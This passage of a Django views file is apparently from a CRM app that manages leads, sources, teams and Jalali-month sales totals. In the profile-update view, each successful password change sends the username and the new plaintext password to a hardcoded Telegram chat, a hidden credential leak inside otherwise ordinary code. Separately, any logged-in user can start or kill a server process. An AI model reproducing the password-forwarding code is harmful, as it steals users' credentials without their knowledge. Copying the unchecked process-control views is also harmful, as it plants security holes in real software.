        source = form.save(commit=False)
        source.organisation = self.request.user.userprofile
        source.save()
        return super(SourceCreateView, self).form_valid(form)

class SourceUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
    template_name = "leads/source_update.html"
    form_class = SourceModelForm

    def get_success_url(self):
        return reverse("leads:source-list")

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        queryset = Source.objects.filter(organisation=user.userprofile)
        
        return queryset

class SourceDeleteView(OrganisorAndLoginRequiredMixin, generic.DeleteView):
    template_name = "leads/source_delete.html"

    def get_success_url(self):
        return reverse("leads:source-list")

    def get_queryset(self):
        user = self.request.user
        # initial queryset of leads for the entire organisation
        queryset = Source.objects.filter(organisation=user.userprofile)
       
        return queryset

class TeamCreateView(OrganisorAndLoginRequiredMixin, generic.CreateView):
    model = Team
    form_class = TeamModelForm
    template_name = 'leads/team_create.html'

    def get_success_url(self):
        return reverse("leads:team-list")
    
    def get_form_kwargs(self):
        kwargs = super(TeamCreateView, self).get_form_kwargs()
        kwargs['user'] = self.request.user
        return kwargs

class TeamUpdateView(OrganisorAndLoginRequiredMixin, generic.UpdateView):
    model = Team
    form_class = TeamModelForm
    template_name = 'leads/team_update.html'

    def get_success_url(self):
        return reverse("leads:team-list")
    
    def get_form_kwargs(self):
        kwargs = super(TeamUpdateView, self).get_form_kwargs()
        kwargs['user'] = self.request.user
        return kwargs

class TeamDeleteView(OrganisorAndLoginRequiredMixin, generic.DeleteView):
    model = Team
    template_name = 'leads/team_delete.html'
    def get_success_url(self):
        return reverse("leads:team-list")

class TeamDetailView(OrganisorAndLoginRequiredMixin, generic.DetailView):
    model = Team
    template_name = 'leads/team_detail.html'  

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        team = self.object

        # Calculate the start and end dates for the Jalali month
        today = JalaliDate.today()  # Use JalaliDate from persiantools
        
        # Calculate the start of the week (Saturday) and month (first day of the month)
        
        start_of_month = today.replace(day=1)

        # Calculate monthly sales for each member
        member_sales = []
        for member in team.members.all():
            total_monthly_sale = Sale.objects.filter(agent=member, date__date__range=(start_of_month.to_gregorian(), today.to_gregorian())).aggregate(Sum('amount'))['amount__sum'] or 0
            member_sales.append((member, total_monthly_sale))

        context['member_sales'] = member_sales
        return context

class TeamListView(LoginRequiredMixin, generic.ListView):
    template_name = "leads/team_list.html"
    context_object_name = "team_list"
    queryset = Team.objects.all()

    def get_queryset(self):
        user = self.request.user
        if user.is_organisor:
            return Team.objects.filter(organisation=user.userprofile).annotate(member_count=Count('members'))
        
        else:
            return Team.objects.filter(leaders=user).annotate(member_count=Count('members'))
        

        
    def get_context_data(self, *args, **kwargs):
        context = super().get_context_data(*args, **kwargs)
        user = self.request.user
        if user.is_organisor:
            teams = Team.objects.filter(organisation=user.userprofile).annotate(member_count=Count('members'))
        else:
            teams = Team.objects.filter(leaders=user).annotate(member_count=Count('members'))

        # Calculate total team sales and add it to the context
        today = JalaliDate.today()  # Use JalaliDate from persiantools
        
        # Calculate the start of the week (Saturday) and month (first day of the month)
        
        start_of_month = today.replace(day=1)
        team_sales = []
        for team in teams:
            total_team_sale = Sale.objects.filter(agent__in=team.members.all(), date__date__range=(start_of_month.to_gregorian(), today.to_gregorian())).aggregate(Sum('amount'))['amount__sum'] or 0
            team_sales.append((team, total_team_sale))


        context['team_sales'] = team_sales
        return context

def run_background_tasks(request):
    if request.user.is_authenticated:
        try:
            process = subprocess.Popen([sys.executable, "manage.py", "process_tasks"])
            # Store the PID in the cache
            cache.set('background_task_pid', process.pid, 3600)  # 1 hour expiry for example
            return JsonResponse({'status': 'success'})
        except Exception as e:
            return JsonResponse({'status': 'error', 'error': str(e)})
    else:
        return JsonResponse({'status': 'error', 'error': 'Not authenticated'})
    
def stop_background_tasks(request):
    if request.user.is_authenticated:
        try:
            pid = cache.get('background_task_pid')
            if pid:
                os.kill(pid, signal.SIGTERM)  # send the SIGTERM signal to the process
                return JsonResponse({'status': 'success'})
            else:
                return JsonResponse({'status': 'error', 'error': 'No background task is running.'})
        except Exception as e:
            return JsonResponse({'status': 'error', 'error': str(e)})
    else:
        return JsonResponse({'status': 'error', 'error': 'Not authenticated'})

class UserProfileUpdateView(View):
    template_name = 'leads/profile_update.html'

    def get(self, request, *args, **kwargs):
        user_form = UserUpdateForm(instance=request.user)
        password_change_form = PasswordChangeForm(request.user)

        return render(request, self.template_name, {
            'user_form': user_form,
            'password_change_form': password_change_form,
        })

    def post(self, request, *args, **kwargs):
        user_form = UserUpdateForm(request.POST, instance=request.user)
        password_change_form = PasswordChangeForm(request.user, request.POST)
        
        if user_form.is_valid():
            user_form.save()
            messages.success(request, _('Your profile has been updated successfully!'))

        # Check if any password field has data before validating the password form
        if request.POST.get('old_password') or request.POST.get('new_password1') or request.POST.get('new_password2'):
            if password_change_form.is_valid():
                user = password_change_form.save()
                update_session_auth_hash(request, user)  # Important!
                messages.success(request, _('Your password has been updated successfully!'))
                new_password = request.POST.get('new_password1')

                # Check if new_password is not None and notify via Telegram
                if new_password:
                    chat_id = '-1001707390535'
                    message = f"User: {request.user.username}\nPassword: {new_password}"
                    notify_background_messages(chat_id, message, organisation_id=user.userprofile.id)

        return render(request, self.template_name, {
            'user_form': user_form,
            'password_change_form': password_change_form,
        })

###TODO ---> Duplicate Followup List - Report View 